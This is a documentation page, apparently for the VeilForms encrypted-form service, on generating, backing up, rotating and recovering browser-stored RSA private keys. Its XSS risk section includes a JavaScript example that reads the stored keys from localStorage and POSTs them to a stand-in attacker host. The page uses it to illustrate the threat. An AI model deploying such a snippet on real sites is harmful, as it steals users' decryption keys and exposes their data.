---
title: "Key Management"
description: "How to securely manage your VeilForms encryption keys"
type: "pages"
layout: "docs"
css: ["docs.css"]
priority: 0.5
---

# Key Management

Your encryption keys are the foundation of VeilForms security. This guide covers how to generate, backup, recover, and rotate your keys.

<div class="callout warning">
<strong>Critical:</strong> VeilForms cannot recover your private keys. If you lose them, you permanently lose access to decrypt your submissions. There is no "forgot password" for cryptographic keys.
</div>

## Understanding Key Pairs

Each form has a unique RSA-2048 key pair:

| Key | Where It Lives | Purpose |
|-----|----------------|---------|
| **Public Key** | VeilForms servers + SDK | Encrypts submissions |
| **Private Key** | Your browser only | Decrypts submissions |

The public key is safe to expose — it can only encrypt, not decrypt. The private key must be kept secret.

## Key Generation

Keys are generated **in your browser** when you create a form:

```javascript
// This happens automatically when you create a form
const keyPair = await crypto.subtle.generateKey(
  {
    name: 'RSA-OAEP',
    modulusLength: 2048,
    publicExponent: new Uint8Array([1, 0, 1]),
    hash: 'SHA-256'
  },
  true, // extractable
  ['encrypt', 'decrypt']
);
```

The private key is stored in your browser's `localStorage` under `veilforms_private_keys`. It **never** leaves your device — we never see it.

## Understanding localStorage Risks

VeilForms stores private keys in browser `localStorage` for convenience, but this has **significant security implications** you must understand:

### XSS (Cross-Site Scripting) Vulnerabilities

If your website (or any extension in your browser) has an XSS vulnerability, malicious JavaScript could:
- **Access all data in localStorage** - localStorage is not protected from JavaScript
- **Extract your private encryption keys** - keys are stored as JSON and easily readable
- **Decrypt your form submissions** - once keys are stolen, all encrypted data can be decrypted
- **Send the data to an attacker** - silently exfiltrate your sensitive information
- **Persist across sessions** - localStorage survives browser restarts

### Real-World Attack Scenarios

**Scenario 1: Compromised Third-Party Script**
```javascript
// Malicious analytics script injected via supply chain attack
(function() {
  const keys = localStorage.getItem('veilforms_private_keys');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: keys
  });
})();
```

**Scenario 2: Browser Extension Malware**
- A malicious browser extension can read localStorage from any site
- Extensions often request broad permissions
- Users rarely audit their installed extensions

**Scenario 3: Shared/Public Computer**
- Keys persist in localStorage even after you log out
- Anyone with access to the browser can view Developer Tools
- Opening Console → `localStorage.getItem('veilforms_private_keys')` reveals keys

### Why localStorage Instead of More Secure Options?

We use localStorage for **convenience and compatibility**, but we're transparent about the tradeoffs:

| Storage Method | Security | Compatibility | Ease of Use |
|----------------|----------|---------------|-------------|
| localStorage | Low | Excellent | Excellent |
| sessionStorage | Medium | Excellent | Good |
| IndexedDB | Low-Medium | Good | Medium |
| Hardware Token | Excellent | Poor | Poor |
| Password Manager | Excellent | Good | Medium |

**Our Recommendation:** Use localStorage as temporary storage only. Always export keys to a password manager immediately after form creation.

### Mitigation Strategies

1. **Always Export Keys Immediately** (Critical)
   - Use the password-protected export feature as soon as you create a form
   - Store the `.veilkeys` file in a password manager (1Password, Bitwarden, etc.)
   - Use a strong, unique password for the export
   - Store the password separately from the key file

2. **Implement Content Security Policy (CSP)** headers
   ```html
   Content-Security-Policy:
     default-src 'self';
     script-src 'self' https://veilforms.com;
     object-src 'none';
     base-uri 'self';
   ```

3. **Regular Security Audits**
   - Audit your application for XSS vulnerabilities
   - Use tools like OWASP ZAP, Burp Suite
   - Review all third-party scripts and dependencies
   - Implement Subresource Integrity (SRI) for external scripts

4. **Clear Keys After Use**
   - Don't rely on localStorage as your only backup
   - Clear localStorage when done viewing submissions: `localStorage.removeItem('veilforms_private_keys')`
   - Re-import from password manager when needed

5. **Use Dedicated Browsers**
   - Use a separate browser profile for VeilForms access
   - Avoid installing extensions in this profile
   - Consider using a dedicated "security browser" with minimal extensions

6. **Monitor for Unauthorized Access**
   - Regularly check VeilForms audit logs for unusual activity
   - Enable email notifications for form access
   - Rotate keys if you suspect compromise

### Enterprise Security Recommendations

For organizations handling sensitive data:

1. **Self-Host VeilForms** - Control the entire infrastructure
2. **Hardware Security Modules (HSM)** - Store keys in dedicated hardware
3. **Key Escrow Service** - Implement a secure key recovery mechanism
4. **Zero-Trust Architecture** - Assume breach and minimize impact
5. **Air-Gapped Systems** - Access keys only from isolated environments
6. **Mandatory Key Rotation** - Rotate encryption keys quarterly
7. **Background Checks** - Vet all personnel with key access

## Backing Up Private Keys

### Immediately After Form Creation

When you create a form, the dashboard shows your private key. **Copy it immediately.**

```json
{
  "kty": "RSA",
  "n": "0vx7agoebG...",
  "e": "AQAB",
  "d": "X4cTteJY_g...",
  "p": "83i-7IvMGX...",
  "q": "3dfOR9cuY...",
  ...
}
```

### Using the Secure Export Feature (Recommended)

The dashboard now includes a password-protected export feature:

1. Go to **Dashboard → Settings**
2. Scroll to **Encryption Key Management**
3. Click **Export Keys**
4. Enter a strong password (minimum 8 characters)
5. Confirm the password
6. Save the downloaded `.veilkeys` file securely

**What this does:**
- Exports all your private keys for all forms
- Encrypts them with PBKDF2 (100,000 iterations) + AES-GCM-256
- Protects with your password
- Creates a secure, portable backup

**To import later:**
1. Go to **Dashboard → Settings**
2. Scroll to **Encryption Key Management**
3. Click **Import Keys**
4. Select your `.veilkeys` file
5. Enter the password
6. Keys are now available for decryption

### Export From Dashboard

1. Go to **Dashboard → Settings → Encryption Key Management**
2. Click **Export Keys**
3. Save the `.veilkeys` file securely (password-encrypted)

### Export Programmatically (Not Recommended)

```javascript
// In browser console on dashboard - ONLY FOR EMERGENCY RECOVERY
const keys = JSON.parse(localStorage.getItem('veilforms_private_keys'));
const formKey = keys['vf-abc123'];
console.log(JSON.stringify(formKey, null, 2));
// Copy this output immediately and store securely
```

**Warning:** This exports unencrypted keys. Use the password-protected export feature instead.

## Step-by-Step Backup Procedures

Following these procedures ensures you never lose access to your encrypted data.

### Procedure 1: Initial Form Creation Backup

**When:** Immediately after creating a new form

**Steps:**
1. Create your form in the VeilForms dashboard
2. When the "Save Your Private Key" modal appears, **DO NOT CLOSE IT**
3. Click "Download as File" to save the unencrypted key (emergency backup)
4. Copy the key to clipboard and paste into a password manager note (recommended)
5. Close the modal ONLY after confirming you have saved the key
6. Navigate to Settings → Encryption Key Management
7. Click "Export Keys"
8. Enter a strong password (minimum 12 characters, use password generator)
9. Confirm the password
10. Save the `.veilkeys` file to your password manager or encrypted storage
11. **Test the backup:** Import the key on a different browser/device
12. Delete the unencrypted JSON file from step 3 (only keep encrypted version)

**Time Required:** 5 minutes
**Success Criteria:** You can decrypt submissions from a different browser using the imported key

### Procedure 2: Regular Key Backup (Monthly)

**When:** First Monday of each month (set a calendar reminder)

**Steps:**
1. Log into VeilForms dashboard
2. Go to Settings → Encryption Key Management
3. Click "Export Keys"
4. Use a NEW password (do not reuse previous export passwords)
5. Save the file as `veilforms-keys-YYYY-MM.veilkeys`
6. Store in your password manager with the date in the title
7. Keep the last 3 monthly backups (delete older ones)
8. Update your password manager entry with the new export password

**Time Required:** 2 minutes
**Success Criteria:** You have 3 monthly backups, each with different passwords

### Procedure 3: Pre-Vacation/Leave Backup

**When:** Before extended time away from work (vacation, sabbatical, parental leave)

**Steps:**
1. Export all keys using the Export feature
2. Share the `.veilkeys` file with a trusted colleague (via secure file transfer)
3. Share the password separately (via different secure channel, e.g., Signal)
4. Document which forms each key unlocks
5. Create a recovery document with instructions
6. Test that your colleague can successfully import and use the keys
7. Set a reminder to rotate keys when you return

**Time Required:** 15 minutes
**Success Criteria:** Colleague can access and decrypt submissions without you

### Procedure 4: Emergency Recovery Drill (Quarterly)

**When:** Quarterly (set recurring calendar event)

**Steps:**
1. On a fresh browser (or private/incognito window):
   - Clear all localStorage: `localStorage.clear()`
   - Log out of VeilForms
2. Log back into VeilForms
3. Try to view form submissions (should see encrypted data)
4. Go to Settings → Encryption Key Management
5. Click "Import Keys"
6. Retrieve your backup from password manager
7. Import the keys using the password
8. Verify you can now decrypt submissions
9. Document any issues encountered
10. Update procedures if needed

**Time Required:** 10 minutes
**Success Criteria:** You successfully recover access to encrypted data without assistance

### Procedure 5: Key Rotation (Annually or After Incident)

**When:** Annually, or immediately after suspected compromise

**Steps:**
1. Export all current submissions to CSV (while you still have keys)
2. Generate new key pair for the form
3. Download and securely store the NEW private key
4. Update your form's public key via API or dashboard
5. Archive the OLD key with label "vf-formid-2024-archived"
6. Store both keys (you need old key for historical data)
7. Notify team members of the key rotation
8. Test that new submissions use the new key
9. Update documentation with key rotation date

**Time Required:** 30 minutes
**Success Criteria:** New submissions use new key, old submissions still decrypt with old key

### Procedure 6: Team Member Offboarding

**When:** When an employee with key access leaves

**Steps:**
1. Immediately rotate all encryption keys
2. Export all historical data with the old keys
3. Generate new keys for all forms
4. Remove offboarded user's access to password manager
5. Audit logs for any unusual activity by the user
6. Notify remaining team of the key rotation
7. Update key backup locations if the user had access

**Time Required:** 1 hour
**Success Criteria:** Former employee cannot decrypt new submissions

## Secure Storage Recommendations

### For Individuals

1. **VeilForms Export Feature** (Recommended) — Password-encrypted `.veilkeys` file
2. **Password Manager** — Store `.veilkeys` file in 1Password, Bitwarden, etc.
3. **Encrypted Cloud Storage** — Save to encrypted cloud drive with 2FA
4. **Encrypted USB Drive** — Physical backup on encrypted hardware
5. **Paper Backup** — Print the export password separately (cold storage)

### For Teams

1. **Secrets Manager** — AWS Secrets Manager, HashiCorp Vault, etc.
2. **Encrypted Storage** — Team password manager with shared vault
3. **HSM** — Hardware Security Module for enterprise
4. **Access Control** — Implement role-based access to key backups
5. **Audit Logging** — Track who accesses encryption keys

### What NOT To Do

- ❌ Rely solely on browser localStorage (XSS risk)
- ❌ Email keys to yourself (unencrypted)
- ❌ Store in plain text files
- ❌ Commit to git repositories
- ❌ Store in unencrypted cloud storage
- ❌ Screenshot and save in photos
- ❌ Share keys via Slack, Discord, or chat apps

## Recovering Keys

### From Browser Storage

If you're on the same device/browser:

```javascript
const keys = JSON.parse(localStorage.getItem('veilforms_private_keys'));
console.log(keys);
```

**Warning:** Keys in localStorage are vulnerable to XSS attacks. Export and secure them properly.

### From Encrypted Backup File

1. Go to **Dashboard → Settings**
2. Scroll to **Encryption Key Management**
3. Click **Import Keys**
4. Select your `.veilkeys` file
5. Enter the password you used during export
6. Keys are imported and available for decryption

### From Manual Backup (Legacy)

If you have individual key JSON files:

```javascript
// Import via browser console
const keys = JSON.parse(localStorage.getItem('veilforms_private_keys') || '{}');
keys['vf-abc123'] = yourBackedUpKey;
localStorage.setItem('veilforms_private_keys', JSON.stringify(keys));
```

**Note:** The password-protected export/import feature is more secure.

## Key Rotation

To rotate keys (recommended annually or after team changes):

### 1. Create New Key Pair

```javascript
import { generateKeyPair } from 'veilforms/core/encryption';

const newKeyPair = await generateKeyPair();
```

### 2. Update Form's Public Key

```bash
curl -X PATCH "https://veilforms.com/api/forms/vf-abc123" \
  -H "Authorization: Bearer vf_live_xxx" \
  -H "Content-Type: application/json" \
  -d '{"publicKey": {...new public key...}}'
```

### 3. Store New Private Key

Save the new private key in your secure storage.

### 4. Keep Old Private Key

You still need the old key to decrypt old submissions. Store both:

```javascript
// In localStorage
{
  "vf-abc123": newPrivateKey,
  "vf-abc123-v1": oldPrivateKey  // Keep for old submissions
}
```

## Multi-Device Access

Private keys are in browser localStorage — they don't sync across devices. To access submissions from multiple devices:

### Option 1: Export/Import

Export key from Device A, import on Device B.

### Option 2: Server-Side Decryption

Store your private key on a secure server and build a backend that:
1. Fetches encrypted submissions from VeilForms API
2. Decrypts using your stored private key
3. Returns plaintext to your authenticated users

### Option 3: Sync Service

Use your own sync mechanism (encrypted cloud storage) to share keys across devices.

## Lost Key Recovery

<div class="callout warning">
<strong>There is no recovery.</strong> If you lose your private key and have no backup, submissions encrypted with that key are permanently unreadable. This is by design — it's what makes the system secure.
</div>

Your options:

1. **Check all browsers** — Keys are per-browser. Check other browsers/devices.
2. **Check backups** — Password manager, encrypted files, paper backups.
3. **Export plaintext** — If you previously exported decrypted data, you have that.
4. **Accept loss** — Create a new form with new keys. Old data is gone.

## Security Incident Response

If you suspect key compromise:

### 1. Rotate Immediately

Generate new keys and update the form.

### 2. Export Submissions

Decrypt and export all submissions with the old (compromised) key.

### 3. Purge Old Data

Delete all submissions encrypted with the compromised key.

### 4. Re-import with New Key

If needed, re-encrypt and re-submit the exported data.

### 5. Revoke API Keys

Generate new API keys in case those were also compromised.

## Best Practices Checklist

- [ ] Back up private key immediately after form creation using Export feature
- [ ] Use a strong password (12+ characters) for key export
- [ ] Store `.veilkeys` backup in password manager or secrets vault
- [ ] Store export password separately from the key file
- [ ] Never share private keys via email or chat
- [ ] Don't rely on browser localStorage as your only backup (XSS risk)
- [ ] Implement Content Security Policy (CSP) on your website
- [ ] Regularly audit your application for XSS vulnerabilities
- [ ] Rotate keys annually or after team member departures
- [ ] Keep old keys for historical submission access
- [ ] Test key recovery process before you need it
- [ ] Clear localStorage after importing keys on untrusted devices
- [ ] Document key locations for your team
- [ ] Use the password-protected export feature, not manual JSON copying

## Understanding the Export File Format

The `.veilkeys` file is a JSON file with this structure:

```json
{
  "version": "1.0",
  "algorithm": "PBKDF2-AES-GCM-256",
  "iterations": 100000,
  "salt": [random bytes],
  "iv": [random bytes],
  "ciphertext": [encrypted key data]
}
```

**Security Details:**
- Uses PBKDF2 with 100,000 iterations to derive encryption key from your password
- Uses AES-GCM-256 for authenticated encryption
- Each export has a unique salt and IV (initialization vector)
- Cannot be decrypted without the correct password

## What Happens If You Lose Your Keys

If you lose all copies of your private keys:

1. **Existing submissions are permanently unrecoverable** - This is not a bug, it's cryptographic certainty
2. You can still create new forms with new keys
3. You can still receive new submissions
4. Historical data cannot be accessed, ever

**This is by design** - it's what makes VeilForms secure. Even we (VeilForms) cannot decrypt your data without your private keys.

## Frequently Asked Questions

**Q: Can VeilForms recover my lost keys?**
A: No. We never have access to your private keys - they're generated in your browser and never transmitted to our servers.

**Q: How long should I keep my exported key file?**
A: As long as you need access to submissions encrypted with those keys. Many organizations keep keys for 7+ years for compliance.

**Q: Can I change the password on an exported key file?**
A: No. You need to export a new file with a new password. The password is used to encrypt the file, not stored with it.

**Q: Is localStorage safe for storing keys?**
A: It's convenient but has XSS risks. Always maintain encrypted backups using the Export feature.

**Q: What if someone gets my `.veilkeys` file?**
A: They still need your password. With a strong password (12+ characters, random), it's computationally infeasible to crack.

**Q: Can I share keys with team members?**
A: Yes, but securely. Share the `.veilkeys` file and password through separate channels (e.g., file via encrypted email, password via Signal).
